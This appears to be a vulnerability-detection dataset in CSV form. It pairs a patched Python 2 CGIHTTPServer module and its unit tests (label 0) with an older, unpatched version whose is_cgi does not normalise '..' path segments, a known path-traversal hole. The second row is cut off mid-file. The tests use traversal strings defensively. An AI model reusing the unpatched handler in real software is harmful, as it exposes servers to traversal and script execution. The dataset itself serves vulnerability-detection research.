,id,code,label
0,c5abced949e6a4b001d1dee321593e74ecadecfe,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
1,c5abced949e6a4b001d1dee321593e74ecadecfe,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
